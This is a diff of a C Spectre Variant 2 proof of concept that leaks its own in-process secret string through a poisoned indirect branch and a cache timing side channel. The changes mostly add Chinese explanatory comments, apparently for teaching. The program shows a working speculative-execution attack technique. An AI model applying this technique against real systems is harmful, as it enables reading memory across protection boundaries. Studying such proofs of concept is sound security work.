@@ -2,7 +2,6 @@
  * Spectre Variant 2 Proof of Concept.
  * The program uses spectre v2 to read its own memory.
  */
-
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -18,15 +17,23 @@
 #define GAP (1024)
 
 uint8_t channel[256 * GAP]; // cache side channel to extract secret phrase
-uint64_t *target; // pointer to indirect call target
+
+
+
+uint64_t *target; // 64bit指针   pointer to indirect call target
+
+
 char *secret = "NingXiaUniversity@xgy";
 
-// mistrained target of indirect call
+
+
+//间接跳转的目的地址 spectre gadget
 int gadget(char *addr)
 {
-  // speculative loads fetch data into the cache
-  return channel[*addr * GAP]; 
+  return channel[*addr * GAP]; //访问该数组 ，将其带到cache 侧信道中
 }
+
+
 
 // safe target of indirect call
 int safe_target()
@@ -34,6 +41,9 @@ int safe_target()
   return 42;
 }
 
+
+
+// victim function
 // function that makes indirect call
 // note that addr will be passed to gadget via %rdi
 int victim(char *addr, int input)
@@ -44,19 +54,26 @@ int victim(char *addr, int input)
   for (int i = 1; i <= 100; i++) {
     input += i;
     junk += input & i;
-  }
+  }//毒害间接预测分支
 
   int result;
   // call *target
+//汇编指令序列
+//输出操作数
+//输入操作数
+//破坏列表
+//寄存器内容前面加*表示间接寻址，以%1寄存器中的数值所指向的地址
   __asm volatile("callq *%1\n"
                  "mov %%eax, %0\n"
                  : "=r" (result)
                  : "r" (*target)
                  : "rax", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r11");
+  
+  //将eax的值传递到result中
   return result & junk;
-}
+}//Victim function
 
-// see appendix C of https://spectreattack.com/spectre.pdf
+
 void readByte(char *addr_to_read, char result[2], int score[2])
 {
   int hits[256]; // record number of cache hits
@@ -65,14 +82,17 @@ void readByte(char *addr_to_read, char result[2], int score[2])
   uint8_t *addr;
   char dummyChar = '$';
 
+  //初始化操作
   for (i = 0; i < 256; i++) {
-    hits[i] = 0;
-    channel[i * GAP] = 1;
+    hits[i] = 0;//初始化记录数组
+    channel[i * GAP] = 1;//初始化侧信道测量数组
   }
 
+//循环1000次取结果数最大的结果作为分析结论
   for (tries = 999; tries > 0; tries--) {
+    
     // poison branch target predictor
-    *target = (uint64_t)&gadget;
+    *target = (uint64_t)&gadget;//gadget的地址
 
     _mm_mfence();
 
@@ -132,7 +152,7 @@ void readByte(char *addr_to_read, char result[2], int score[2])
         (hits[j] == 2 && hits[k] == 0)) {
       break;
     }
-  }
+  }//for tries 1000
 
   hits[0] ^= junk; // prevent junk from being optimized out
   result[0] = (char)j;
@@ -141,6 +161,11 @@ void readByte(char *addr_to_read, char result[2], int score[2])
   score[1] = hits[k];
 }
 
+
+
+//
+// main function
+//
 int main(int argc, char *argv[])
 {
   target = (uint64_t*)malloc(sizeof(uint64_t));
@@ -157,7 +182,7 @@ int main(int argc, char *argv[])
 
   printf("Reading %d bytes starting at %p:\n", len, addr);
   while (--len >= 0) {
-    printf("reading %p...", addr);
+    printf("reading %p     ", addr);
     readByte(addr++, result, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "成功" : "失败"));
     printf("0x%02X='%c'\n", result[0], (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
